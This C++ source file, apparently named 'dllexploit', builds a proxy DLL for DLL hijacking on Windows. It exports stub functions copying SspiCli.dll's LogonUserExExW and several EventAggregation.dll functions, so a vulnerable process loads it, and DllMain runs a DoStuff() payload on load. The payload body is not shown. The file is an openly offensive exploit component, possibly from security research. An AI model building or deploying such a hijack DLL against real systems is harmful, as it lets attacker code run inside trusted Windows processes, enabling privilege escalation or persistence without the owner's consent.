#include "dllexploit.h"
//
// Windows 8.1 -> SspiCli.dll
//
//   000000014005B1C8  LogonUserExExW SspiCli
//
extern "C" __declspec(dllexport) void APIENTRY LogonUserExExW();

//
// Windows 10 -> EventAggregation.dll
//
//   0000000140083728  EaDeleteAggregatedEvent EventAggregation
//   0000000140083730  BriCreateBrokeredEvent EventAggregation
//   0000000140083738  EaCreateAggregatedEvent EventAggregation
//   0000000140083740  BriDeleteBrokeredEvent EventAggregation
//   0000000140083748  EACreateAggregateEvent EventAggregation
//   0000000140083750  EaQueryAggregatedEventParameters EventAggregation
//   0000000140083758  EaFreeAggregatedEventParameters EventAggregation
//   0000000140083760  EADeleteAggregateEvent EventAggregation
//   0000000140083768  EAQueryAggregateEventData EventAggregation
//
extern "C" __declspec(dllexport) void APIENTRY BriCreateBrokeredEvent();
extern "C" __declspec(dllexport) void APIENTRY BriDeleteBrokeredEvent();
extern "C" __declspec(dllexport) void APIENTRY EaCreateAggregatedEvent();
extern "C" __declspec(dllexport) void APIENTRY EACreateAggregateEvent();
extern "C" __declspec(dllexport) void APIENTRY EaQueryAggregatedEventParameters();
extern "C" __declspec(dllexport) void APIENTRY EAQueryAggregateEventData();
extern "C" __declspec(dllexport) void APIENTRY EaFreeAggregatedEventParameters();
extern "C" __declspec(dllexport) void APIENTRY EaDeleteAggregatedEvent();
extern "C" __declspec(dllexport) void APIENTRY EADeleteAggregateEvent();

HMODULE g_hInstance = NULL;
HANDLE g_hConsoleOutput = NULL;
LPWSTR g_pwszGuid = NULL;
BOOL g_bVerbose = TRUE;
BOOL g_bDebug = TRUE;
LPWSTR g_pwszOption = NULL;
DWORD g_dwPidToKill = 0;

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        g_hInstance = hModule;
        if (g_bDebug)
            LogToConsole(L"DllMain (process attach)\n");
        DoStuff();
        break;
    case DLL_THREAD_ATTACH:
        if (g_bDebug)
            LogToConsole(L"DllMain (thread attach)\n");
        break;
    case DLL_THREAD_DETACH:
        if (g_bDebug)
            LogToConsole(L"DllMain (thread detach)\n");
        break;
    case DLL_PROCESS_DETACH:
        if (g_bDebug)
            LogToConsole(L"DllMain (process detach)\n");
        if (g_hConsoleOutput)
            FreeConsole();
        break;
    }
    return TRUE;
}

//
// SspiCli.dll
//
void APIENTRY LogonUserExExW() {
    LogToConsole(L"LogonUserExExW)\n");
}

//
// EventAggregation.dll
//
void APIENTRY BriCreateBrokeredEvent() {
    LogToConsole(L"BriCreateBrokeredEvent\n");
}
void APIENTRY BriDeleteBrokeredEvent() {
    LogToConsole(L"BriDeleteBrokeredEvent\n");
}
void APIENTRY EaCreateAggregatedEvent() {
    LogToConsole(L"EaCreateAggregatedEvent\n");
}
void APIENTRY EACreateAggregateEvent() {
    LogToConsole(L"EACreateAggregateEvent\n");
}
void APIENTRY EaQueryAggregatedEventParameters() {
    LogToConsole(L"EaQueryAggregatedEventParameters\n");
}
void APIENTRY EAQueryAggregateEventData() {
    LogToConsole(L"EAQueryAggregateEventData\n");
}
void APIENTRY EaFreeAggregatedEventParameters() {
    LogToConsole(L"EaFreeAggregatedEventParameters\n");
}
void APIENTRY EaDeleteAggregatedEvent() {
    LogToConsole(L"EaDeleteAggregatedEvent\n");
}
void APIENTRY EADeleteAggregateEvent() {
    LogToConsole(L"EADeleteAggregateEvent\n");
}
